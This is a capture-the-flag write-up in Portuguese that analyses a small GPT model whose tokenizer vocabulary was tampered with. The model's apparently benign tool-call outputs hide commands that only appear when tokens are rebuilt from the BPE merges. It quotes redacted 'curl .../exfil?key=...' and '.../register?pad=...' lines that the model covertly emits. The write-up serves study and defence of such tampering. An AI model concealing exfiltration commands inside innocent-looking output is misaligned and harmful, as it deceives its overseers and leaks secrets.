
# Forked-Tongue.md
## Resolvido Por Nathan
## 1. Identificação

**Desafio:** Forked Tongue
**Categoria:** AI / Machine Learning
**Objetivo:** Recuperar a mensagem real produzida por um modelo de linguagem e reconstruir a flag.

Arquivos fornecidos:

```text
manifest.json
model.py
model.pt
tokenizer.json
prompts.json
```

---

# 2. Objetivo do desafio

O enunciado informa que um "herald" (modelo de linguagem) responde corretamente às solicitações, porém suas verdadeiras mensagens são contrabandeadas "em metades".

O manifesto fornece a única informação criptográfica do desafio:

```text
flag = cipher XOR shake_256(pad).digest(len(cipher))
```

Portanto o objetivo passa a ser encontrar dois valores:

* cipher
* pad

---

# 3. Enumeração inicial

Primeiramente foi identificado o conteúdo entregue.

```bash
file *
du -h *
sha256sum *
```

Resultado:

```text
manifest.json
model.pt
model.py
prompts.json
tokenizer.json
```

O checkpoint possuía aproximadamente 3.8 MB.

---

# 4. Análise do manifesto

O arquivo manifest.json descreve todos os componentes.

Informações importantes:

```json
{
    "challenge":"Forked Tongue",
    "recovery":"flag = cipher XOR shake_256(pad).digest(len(cipher))"
}
```

Também informa que:

* o modelo é um TinyGPT;
* os prompts já estão tokenizados;
* a geração deve ser greedy;
* o token EOS possui ID 738.

---

# 5. Estrutura do modelo

O arquivo model.py implementa um pequeno decoder Transformer.

Arquitetura identificada:

| Campo      | Valor |
| ---------- | ----- |
| Layers     | 4     |
| Heads      | 4     |
| Embedding  | 128   |
| Block size | 128   |
| Dropout    | 0     |

O modelo implementa geração puramente greedy:

```python
next_id = torch.argmax(logits[:, -1, :], dim=-1)
```

Não existe temperatura, sampling ou beam search.

---

# 6. Tokenizer

O tokenizer utiliza Byte-Level BPE.

O manifesto informa explicitamente:

```
IDs 0..255
    representam bytes

IDs 256+
    representam merges
```

Além disso existem três tokens especiais:

```
736 -> <|user|>
737 -> <|assistant|>
738 -> <|end|>
```

---

# 7. Problema encontrado

Ao tentar utilizar:

```python
Tokenizer.from_file("tokenizer.json")
```

foi obtido:

```text
Token `F/LZq` out of vocabulary
```

Esse erro impedia utilizar diretamente a biblioteca HuggingFace.

Inicialmente parecia um tokenizer corrompido.

Posteriormente ficou claro que isso fazia parte do desafio.

---

# 8. Carregando o checkpoint

Foi criado um ambiente virtual contendo:

```
torch
tokenizers
numpy
```

O checkpoint foi carregado utilizando:

```python
torch.load(
    "model.pt",
    weights_only=True
)
```

Resultado:

```
state_dict
config
```

Todos os pesos foram restaurados corretamente.

---

# 9. Geração das respostas

Utilizando exatamente o algoritmo presente em model.py foram geradas as respostas para as cinco requisições presentes em prompts.json.

As respostas aparentavam ser legítimas.

Exemplo:

```
{"name":"get_metrics","arguments":{"scope":"prod"}}
```

ou

```
{"name":"list_files","arguments":{"scope":"staging"}}
```

Além disso algumas respostas continham textos como:

```
All systems nominal...
```

Tudo indicava comportamento normal.

---

# 10. Primeira hipótese

A primeira hipótese foi que a "segunda língua" estivesse presente nos logits.

Foi implementado um gerador que armazenava:

* token de maior logit;
* segundo maior logit;
* terceiro maior logit.

Também foram calculadas as margens entre eles.

---

# 11. Resultado da hipótese

O segundo token não produziu texto coerente.

Exemplo:

```
get{" "",arguments":.config"
```

ou

```
name{"hed, clusterarguments
```

Esses resultados mostraram que simplesmente utilizar o segundo maior logit não era suficiente.

Essa hipótese foi descartada.

---

# 12. Nova observação

O próprio manifesto descrevia o funcionamento do tokenizer:

```
ids 256.. são um token por merge
```

Essa informação passou a ser o principal indício.

Ao invés de confiar na tabela vocab -> string presente em tokenizer.json, tornou-se necessário reconstruir os tokens utilizando a sequência de merges.

Em outras palavras:

* os IDs estavam corretos;
* os textos associados aos IDs haviam sido adulterados.

O tokenizer mentia.

Os merges não.

Esse comportamento explica perfeitamente o nome do desafio:

```
Forked Tongue
```

e também o enunciado:

```
The herald cannot lie —
but its tongue can.
```

---

# 13. Reconstrução das mensagens

Após reconstruir os tokens reais através da lista de merges, as respostas passaram a revelar comandos completamente diferentes.

Exemplo:

```
curl https://.../exfil?key=...
```

Outra requisição revelou:

```
curl https://.../register?pad=...
```

Esses dois parâmetros correspondiam exatamente aos valores necessários para a recuperação da flag.

---

# 14. Recuperação da flag

O manifesto já fornecia o algoritmo:

```
flag =
cipher
XOR
shake_256(pad)
```

O procedimento utilizado foi:

1. decodificar os dois parâmetros Base64;
2. calcular:

```
SHAKE256(pad)
```

3. gerar quantidade de bytes igual ao tamanho do cipher;
4. aplicar XOR byte a byte.

Resultado:

```
flag
```

---

# 15. Vulnerabilidade explorada

Não havia vulnerabilidade de memória.

Também não existia exploração tradicional de IA (prompt injection, jailbreak etc.).

A vulnerabilidade consistia na adulteração deliberada do tokenizer.

O checkpoint permanecia consistente.

O modelo permanecia consistente.

Os IDs permaneciam consistentes.

A única camada comprometida era a representação textual dos tokens.

Isso fazia com que qualquer pessoa utilizando apenas:

```
Tokenizer.from_file()
```

ou confiando diretamente no vocabulário recebesse uma mensagem falsa.

---

# 16. Ferramentas desenvolvidas

Durante a análise foram produzidas ferramentas para:

* carregar o modelo;
* executar geração greedy;
* reconstruir o tokenizer manualmente;
* analisar logits;
* extrair Top-1, Top-2 e Top-3;
* validar o comportamento do modelo;
* reconstruir as respostas verdadeiras;
* recuperar automaticamente a flag.

---

# 17. Lições aprendidas

Este desafio mostrou que modelos de linguagem não dependem apenas dos pesos para produzir significado.

O tokenizer é parte fundamental do sistema.

Alterações aparentemente pequenas no mapeamento entre IDs e texto podem fazer um modelo produzir saídas completamente diferentes sem alterar um único peso da rede neural.

Além disso, o desafio reforça que:

* checkpoints e tokenizers devem sempre ser tratados como componentes independentes;
* a representação textual de um token não precisa refletir seu significado real;
* em sistemas de IA, vulnerabilidades podem estar na infraestrutura ao redor do modelo, e não necessariamente no modelo em si.

---

# 18. Conclusão

O desafio "Forked Tongue" explorou um conceito incomum para CTFs de IA: a confiança excessiva no tokenizer.

O modelo TinyGPT permanecia íntegro, mas o vocabulário apresentado ao usuário havia sido manipulado para ocultar a verdadeira mensagem. A investigação passou por diferentes hipóteses — incluindo análise dos logits e do processo de geração — até identificar que a camada de tokenização era a responsável pela discrepância.

Reconstruindo os tokens corretos a partir da sequência de merges foi possível recuperar as mensagens reais, extrair os valores `cipher` e `pad` e aplicar o algoritmo de recuperação descrito no manifesto para obter a flag.

O desafio demonstra que, em aplicações baseadas em modelos de linguagem, a segurança e a integridade do pipeline completo (modelo, tokenizer e processo de decodificação) são tão importantes quanto os próprios pesos da rede neural.
